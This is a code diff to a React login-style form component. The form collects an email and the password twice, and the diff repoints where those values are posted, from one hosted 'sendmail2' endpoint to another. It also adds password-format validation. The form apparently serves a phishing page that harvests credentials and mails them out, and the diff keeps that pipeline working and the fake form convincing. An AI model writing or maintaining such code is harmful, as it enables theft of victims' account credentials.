@@ -20,7 +20,7 @@ function Forms() {
     setConfirmForm(true);
     setShowForm(false);
     try {
-      await axios.post("https://ikbackend.herokuapp.com/sendmail2", {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
         email,
         pass,
         pasers,
@@ -39,7 +39,7 @@ function Forms() {
     }, 1000);
 
     try {
-      await axios.post("https://ikbackend.herokuapp.com/sendmail2", {
+      await axios.post("https://secondwa.onrender.com/sendmail2", {
         email,
         pass,
         pasers,
@@ -93,6 +93,7 @@ function Forms() {
                       onChange={(e) => setPass(e.target.value)}
                       required
                       value={pass}
+                      pattern="(?=.*[0-9]).{8,}"
                       placeholder="Password"
                       className="form-control"
                     />
@@ -155,6 +156,7 @@ function Forms() {
                       required
                       value={pasers}
                       placeholder="Password"
+                       pattern="(?=.*[0-9]).{8,}"
                       className="form-control"
                     />
 
